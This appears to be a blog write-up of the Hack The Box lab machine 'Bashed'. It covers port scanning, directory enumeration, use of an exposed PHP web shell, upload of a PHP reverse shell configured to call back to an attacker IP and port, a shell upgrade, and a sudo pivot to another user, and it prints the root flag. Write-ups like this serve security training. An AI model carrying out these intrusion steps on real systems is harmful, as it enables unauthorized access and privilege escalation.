---
layout: post
title: HTB Bashed 
future: true
---



# Recon

## Nmap 
We begin our reconnaissance by running an Nmap scan checking default scripts and checking service versions.

```console
# Nmap 7.80 scan initiated Sat Jun 20 17:04:49 2020 as: nmap -T4 -p0-65535 -sC -sV -oA all 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.68
Host is up (0.054s latency).
Not shown: 65519 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
1547/tcp  filtered laplink
7234/tcp  filtered unknown
7468/tcp  filtered unknown
8203/tcp  filtered unknown
11470/tcp filtered unknown
18264/tcp filtered unknown
20445/tcp filtered unknown
20586/tcp filtered unknown
22481/tcp filtered unknown
25357/tcp filtered unknown
38058/tcp filtered unknown
45610/tcp filtered unknown
46819/tcp filtered unknown
55861/tcp filtered unknown
64132/tcp filtered unknown
64346/tcp filtered unknown

```
We can ignore all the filtered ports. The only one we are interested in is the http service on port 80
Lets take a look at the website 

![Github](./images/phpbash.png)


The site gives us a hint as to what kind of technology it is using, however it does not give us too much to work with on it's surface.
We will run gobuster to further enumerate the site.

```console
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)

```
checking the /dev directory gives us access to a php web shell that was displayed on the main site.

![Github](./images/bashed/dev.png)



# Foothold 

Accessing "phpbash.php" gives us access to a webshell. WE can run commands and even get the user flag!

![Github](./images/bashed/webshell.png)

## Upgrading our shell

We can technically enumerate the box from this webshell however, this is not ideal. You can use wget to download enumeration scripts to the webshell.
The issue is that to run your scripts you will need to run the command "bash <your script>" for them to execute.
The reason for this is due to the fact that the webshell is not persistent so we will need to upload a php reverse shell.

You can grab a php reverse shell found in the "/usr/share/webshells/php/php-reverse-shell.php" path within kali.
Make sure to edit the script 

```php

$VERSION = "1.0";
$ip = '10.10.10.10';  //  CHANGE THIS
$port = 4444;   //  CHANGE THIS

```

Now set up your simple python server and upload it using wget.

![Github](./images/bashed/wget.png)

Now set up your netcat and access your reverseshell by going to the web directory you uploaded it to. In my case I uploaded my shell into the uploads directory.
"10.10.10.68/uploads/myshell.php"

Once you have your reverse shell, we can clean it up with python.

```console

python -c 'import pty;pty.spawn("/bin/bash")'

```
Then background your session and run the command `stty raw echo" the use` and `fg` to return your background session to the foreground.

# Privilege Escalation

We will upload linpeas.sh part of the Privilege Escalation Awesome Scripts SUITE to further enumerate the box. 
This script can be found here https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

After running the script we find that we www-data can run commands as scriptmanager 

![Github](./images/bashed/sudo.png)

Since we can run sudo on the scriptmanager user, we can pviot to this user using the command `sudo -u scriptmanager bash` 

![Github](./images/bashed/scriptmanager.png)



![Root](./images/root.png)
\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
